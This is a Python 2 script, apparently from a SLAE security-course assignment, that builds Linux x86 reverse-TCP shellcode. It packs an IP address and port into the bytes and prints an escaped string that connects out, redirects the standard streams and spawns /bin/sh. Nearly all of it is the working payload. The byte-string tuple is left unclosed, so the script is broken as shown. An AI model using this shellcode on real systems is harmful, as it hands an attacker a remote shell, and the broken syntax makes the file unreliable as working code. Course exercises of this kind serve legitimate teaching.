#!/usr/bin/env python

# Shell Reverse TCP (79 bytes) Generator
# Paw Petersen, SLAE-656
# https://www.pawpetersen.dk/slae-assignment-2-shell-reverse-tcp-linux-x86/

import struct

ip = "192.168.56.1"
port = 1337

ip = [int(i) for i in ip.split(".")]
packed_ip = struct.pack("!4B",ip[0],ip[1],ip[2],ip[3])
packed_port = struct.pack("!H",port)

sc = ("\x31\xc0\x50\xb0\x66\x6a\x01\x8b\x1c\x24\x6a\x02\x89\xe1\xcd\x80"
      "\x89\xc6\x68"+packed_ip+"\x66\x68"+packed_port+"\x66\x6a\x02\x89"
      "\xe1\xb0\x66\xb3\x03\x6a\x10\x51\x56\x89\xe1\xcd\x80\x31\xc9\xb1"
      "\x03\xfe\xc9\xb0\x3f\xcd\x80\x75\xf8\xb0\x0b\x31\xd2\x52\x68\x6e"
      "\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x52\x53\x89\xe1\xcd\x80"

print '"' + ''.join('\\x%02x' % ord(c) for c in sc) + '";'
